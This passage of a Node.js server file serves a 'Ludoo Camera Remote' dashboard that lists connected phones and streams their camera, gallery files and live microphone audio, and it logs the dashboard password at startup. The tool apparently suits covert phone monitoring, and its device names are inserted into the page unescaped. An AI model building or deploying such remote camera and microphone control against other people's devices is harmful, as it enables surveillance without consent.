        overlayWrap.style.width = w + 'px'; overlayWrap.style.height = h + 'px';
    }
    function applyOverlayTransform() { overlayVideo.style.transform = 'rotate(' + overlayRotation + 'deg)'; }
    function syncOverlayFrame() {
        if (video.src && video.style.display !== 'none') {
            overlayVideo.src = video.src; overlayVideo.style.display = 'block'; overlayPlaceholder.style.display = 'none';
        } else { overlayVideo.style.display = 'none'; overlayPlaceholder.style.display = 'flex'; }
        applyOverlayTransform();
    }
    document.getElementById('expandBtn').addEventListener('click', () => { setDefaultOverlaySize(); overlayRotation = 0; applyOverlayTransform(); videoOverlay.classList.add('active'); syncOverlayFrame(); });
    document.getElementById('overlayCloseBtn').addEventListener('click', () => videoOverlay.classList.remove('active'));
    document.getElementById('rotateBtn').addEventListener('click', () => { overlayRotation = (overlayRotation + 90) % 360; applyOverlayTransform(); });

    let isResizing = false, resizeStartX, resizeStartY, resizeStartW, resizeStartH;
    document.getElementById('overlayResizeHandle').addEventListener('mousedown', e => {
        e.preventDefault(); isResizing = true;
        resizeStartX = e.clientX; resizeStartY = e.clientY;
        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
    });
    document.addEventListener('mousemove', e => {
        if (!isResizing) return;
        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.clientX - resizeStartX)) + 'px';
        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.clientY - resizeStartY)) + 'px';
    });
    document.addEventListener('mouseup', () => isResizing = false);

    document.getElementById('overlayResizeHandle').addEventListener('touchstart', e => {
        e.preventDefault(); isResizing = true;
        resizeStartX = e.touches[0].clientX; resizeStartY = e.touches[0].clientY;
        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
    }, { passive: false });
    document.addEventListener('touchmove', e => {
        if (!isResizing) return;
        e.preventDefault();
        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.touches[0].clientX - resizeStartX)) + 'px';
        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.touches[0].clientY - resizeStartY)) + 'px';
    }, { passive: false });
    document.addEventListener('touchend', () => isResizing = false);

    let pinchStartDist = 0, pinchStartW = 0, pinchStartH = 0;
    function getTouchDist(touches) {
        const dx = touches[0].clientX - touches[1].clientX;
        const dy = touches[0].clientY - touches[1].clientY;
        return Math.sqrt(dx * dx + dy * dy);
    }
    overlayWrap.addEventListener('touchstart', e => {
        if (e.touches.length === 2) {
            e.preventDefault();
            pinchStartDist = getTouchDist(e.touches);
            pinchStartW = overlayWrap.offsetWidth;
            pinchStartH = overlayWrap.offsetHeight;
        }
    }, { passive: false });
    overlayWrap.addEventListener('touchmove', e => {
        if (e.touches.length === 2) {
            e.preventDefault();
            const dist = getTouchDist(e.touches);
            const scale = dist / pinchStartDist;
            const newW = Math.min(window.innerWidth - 20, Math.max(160, pinchStartW * scale));
            const newH = Math.min(window.innerHeight - 20, Math.max(100, pinchStartH * scale));
            overlayWrap.style.width  = newW + 'px';
            overlayWrap.style.height = newH + 'px';
        }
    }, { passive: false });

    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
    function showDeviceStatus(device) {
        document.getElementById('modalDeviceName').textContent = '📱 ' + device.name;
        const battery = device.batteryPercentage || 0;
        const ws = device.hasWebSocket;
        document.getElementById('modalContent').innerHTML =
            '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
            '<div class="status-item"><span class="status-label">WebSocket</span><span class="' + (ws ? 'status-allowed' : 'status-pending') + '">' + (ws ? '⚡ Active' : '⏳ HTTP only') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored' : '❌ Not Ignored') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
            '<div class="status-item"><span class="status-label">Gallery Files</span><span style="color:#ccc">' + (device.galleryCount || 0) + ' files</span></div>' +
            '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
        document.getElementById('statusModal').style.display = 'flex';
    }

    function selectDevice(deviceId) {
        if (selectedDeviceId === deviceId) return;
        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
        selectedDeviceId = deviceId;
        wasStreaming = false; isStreaming = false; userStoppedStream = false;
        lastFrameTs = 0;
        disconnectedOverlay.classList.remove('show');
        video.src = ''; video.style.display = 'none';
        placeholder.textContent = '▶ Press START to stream'; placeholder.style.display = 'block';
        fpsCountSpan.textContent = '0';
        renderDeviceList();
    }

    function renderDeviceList() {
        const connected = currentDevices.filter(d => d.isConnected);
        deviceCountSpan.textContent = connected.length;
        if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; }
        devicesList.innerHTML = connected.map(d =>
            '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-id="' + d.id + '">' +
            '<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0;">' +
            '<span class="device-name" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">📱 ' + d.name + (d.hasWebSocket ? ' <span style="font-size:10px;color:#4CAF50">⚡WS</span>' : '') + '</span>' +
            (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
            '</div>' +
            '<div style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;">' +
            '<button data-gallery="' + d.id + '" style="background:none;border:1px solid #667eea;color:#667eea;font-size:10px;padding:3px 7px;border-radius:8px;cursor:pointer;">📸 Gallery</button>' +
            '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:10px;padding:3px 7px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
            '<div class="device-status-dot status-connected"></div>' +
            '</div></div>'
        ).join('');
        
        devicesList.querySelectorAll('.device-item').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.dataset.gallery) { 
                    const device = currentDevices.find(d => d.id === e.target.dataset.gallery);
                    if (device) openGallery(device.id);
                    return;
                }
                if (e.target.dataset.info) { 
                    const d = currentDevices.find(x => x.id === e.target.dataset.info); 
                    if (d) showDeviceStatus(d); 
                    return; 
                }
                selectDevice(el.dataset.id);
            });
        });
    }

    function checkSelectedDeviceStatus(list) {
        if (!selectedDeviceId) return;
        const sel = list.find(d => d.id === selectedDeviceId);
        if (sel && !sel.isConnected && isStreaming) {
            wasStreaming = true; stopFramePoll(); disconnectedOverlay.classList.add('show'); fpsCountSpan.textContent = '0';
        } else if (sel && sel.isConnected && wasStreaming && !isStreaming && !userStoppedStream) {
            wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommand('start'); startFramePoll();
        }
    }

    async function fetchDevices() {
        try {
            const data = await fetch('/api/devices').then(r => r.json());
            if (data.success) {
                currentDevices = data.devices;
                const connectedList = currentDevices.filter(d => d.isConnected);
                if (!selectedDeviceId && connectedList.length > 0) {
                    selectedDeviceId = connectedList[0].id;
                }
                checkSelectedDeviceStatus(currentDevices);
                renderDeviceList();
            }
        } catch(e) {}
    }

    fetchDevices();
    setInterval(fetchDevices, 3000);

    // ========== PCM AUDIO PLAYER ==========
    let voiceActive   = false;
    let audioCtx      = null;
    let gainNode      = null;
    let analyserNode  = null;
    let nextPlayTime  = 0;
    let totalVoicePackets = 0;
    let levelAnimId   = null;

    const voiceDot        = document.getElementById('voiceDot');
    const voiceStatusText = document.getElementById('voiceStatusText');
    const voicePacketCount= document.getElementById('voicePacketCount');
    const voiceVolSlider  = document.getElementById('voiceVolume');
    const voiceVolLabel   = document.getElementById('voiceVolLabel');
    const voiceLevelBar   = document.getElementById('voiceLevelBar');
    const voiceCodecInfo  = document.getElementById('voiceCodecInfo');
    const voiceSrInfo     = document.getElementById('voiceSampleRateInfo');
    const voiceLatInfo    = document.getElementById('voiceLatencyInfo');

    voiceVolSlider.oninput = () => {
        const pct = voiceVolSlider.value;
        voiceVolLabel.textContent = pct + '%';
        if (gainNode) gainNode.gain.value = pct / 100;
    };

    function initAudio() {
        if (audioCtx) { if (audioCtx.state === 'suspended') audioCtx.resume(); return; }
        audioCtx     = new (window.AudioContext || window.webkitAudioContext)();
        gainNode     = audioCtx.createGain();
        gainNode.gain.value = voiceVolSlider.value / 100;
        analyserNode = audioCtx.createAnalyser();
        analyserNode.fftSize = 256;
        gainNode.connect(analyserNode);
        analyserNode.connect(audioCtx.destination);
        nextPlayTime = audioCtx.currentTime;
        startLevelMeter();
    }

    function startLevelMeter() {
        if (levelAnimId) return;
        const buf = new Uint8Array(analyserNode.frequencyBinCount);
        function tick() {
            levelAnimId = requestAnimationFrame(tick);
            analyserNode.getByteTimeDomainData(buf);
            let peak = 0;
            for (let i = 0; i < buf.length; i++) {
                const v = Math.abs(buf[i] - 128) / 128;
                if (v > peak) peak = v;
            }
            voiceLevelBar.style.width = Math.min(peak * 200, 100) + '%';
            voiceLevelBar.style.background = peak > 0.6
                ? 'linear-gradient(90deg,#f44336,#FF5722)'
                : 'linear-gradient(90deg,#4CAF50,#8BC34A)';
        }
        tick();
    }

    function setVoiceUI(active) {
        voiceActive = active;
        voiceDot.classList.toggle('active', active);
        voiceStatusText.textContent = active ? 'Streaming...' : 'Idle';
        voiceStatusText.style.color  = active ? '#4CAF50' : '#888';
        if (!active) {
            totalVoicePackets = 0;
            voicePacketCount.textContent = '';
            voiceLevelBar.style.width = '0%';
            nextPlayTime = 0;
        }
    }

    document.getElementById('voiceStartBtn').onclick = () => {
        initAudio();
        setVoiceUI(true);
        if (selectedDeviceId) {
            fetch('/api/voice/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: selectedDeviceId })
            }).catch(() => {});
        }
        console.log('🎙️ PCM player started');
    };

    document.getElementById('voiceStopBtn').onclick = () => {
        setVoiceUI(false);
        if (selectedDeviceId) {
            fetch('/api/voice/stop', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: selectedDeviceId })
            }).catch(() => {});
        }
        console.log('⏹ PCM player stopped');
    };

    socket.on('voice_data', (data) => {
        if (!data.audio || !voiceActive) return;

        const idMatch  = !selectedDeviceId || data.deviceId === selectedDeviceId;
        if (!idMatch) return;

        if (!audioCtx || audioCtx.state === 'closed') return;
        if (audioCtx.state === 'suspended') audioCtx.resume();

        const sampleRate = data.sampleRate || 8000;
        const channels   = data.channels   || 1;
        const chunks     = Array.isArray(data.audio) ? data.audio : [data.audio];

        voiceCodecInfo.textContent = 'PCM 16-bit LE';
        voiceSrInfo.textContent    = sampleRate + ' Hz';

        const now = audioCtx.currentTime;
        if (nextPlayTime < now) nextPlayTime = now + 0.05;

        chunks.forEach(chunk => {
            try {
                const raw   = atob(chunk);
                const bytes = new Uint8Array(raw.length);
                for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

                const samples  = Math.floor(bytes.length / 2);
                if (samples === 0) return;

                const buffer   = audioCtx.createBuffer(channels, samples, sampleRate);
                const view     = new DataView(bytes.buffer);
                for (let ch = 0; ch < channels; ch++) {
                    const chanData = buffer.getChannelData(ch);
                    for (let i = 0; i < samples; i++) {
                        const idx = channels === 1 ? i : (i * channels + ch);
                        const byteIdx = idx * 2;
                        chanData[i] = byteIdx + 1 < bytes.length
                            ? view.getInt16(byteIdx, true) / 32768.0
                            : 0;
                    }
                }

                const src = audioCtx.createBufferSource();
                src.buffer = buffer;
                src.connect(gainNode);
                src.start(nextPlayTime);
                nextPlayTime += buffer.duration;

                totalVoicePackets++;
                voicePacketCount.textContent = totalVoicePackets + ' pkts';
                voiceLatInfo.textContent = 'buf ' + Math.round((nextPlayTime - audioCtx.currentTime) * 1000) + 'ms';
            } catch(e) { console.warn('PCM decode error:', e.message); }
        });
    });
</script>
</body>
</html>`);
});

// ========== START ==========
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('═══════════════════════════════════════════════════');
    console.log('✅  Ludoo Camera Remote  —  WebSocket + HTTP Mode');
    console.log('═══════════════════════════════════════════════════');
    console.log('🌐  Web UI       : http://localhost:' + PORT);
    console.log('🔑  Password     : ' + DASHBOARD_PASSWORD);
    console.log('📦  Batch Upload : POST /api/batch');
    console.log('⚡  WebSocket    : Stream Only');
    console.log('📡  Commands     : HTTP Polling + WS');
    console.log('📸  Gallery      : ✅ ENABLED (Folder View)');
    console.log('═══════════════════════════════════════════════════');
    console.log('');
});
